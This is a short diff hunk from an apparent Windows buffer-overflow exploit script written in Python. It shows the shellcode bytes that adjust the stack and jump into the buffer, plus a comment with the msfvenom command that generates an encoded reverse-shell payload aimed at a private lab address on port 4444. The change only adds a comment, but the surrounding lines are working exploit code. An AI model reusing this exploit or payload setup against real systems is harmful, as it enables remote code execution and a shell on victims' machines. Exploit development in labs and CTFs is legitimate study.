@@ -30,7 +30,7 @@ ascii_nop = "\x43\x4B"
 stackAdj = "\x54\x58"                   # PUSH ESP | POP EAX
 stackAdj += "\x66\x05\x6c\x01"*4        # add ax, 0x16c    ; adjusts EAX to beginning of A's
 stackAdj += "\x40"                      # inc eax
-stackAdj += "\xff\xd0"
+stackAdj += "\xff\xd0"                  # call eax
 
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.16 LPORT=4444 -e x86/alpha_mixed BufferRegister=EAX -f python
 # x86/alpha_mixed chosen with final size 702
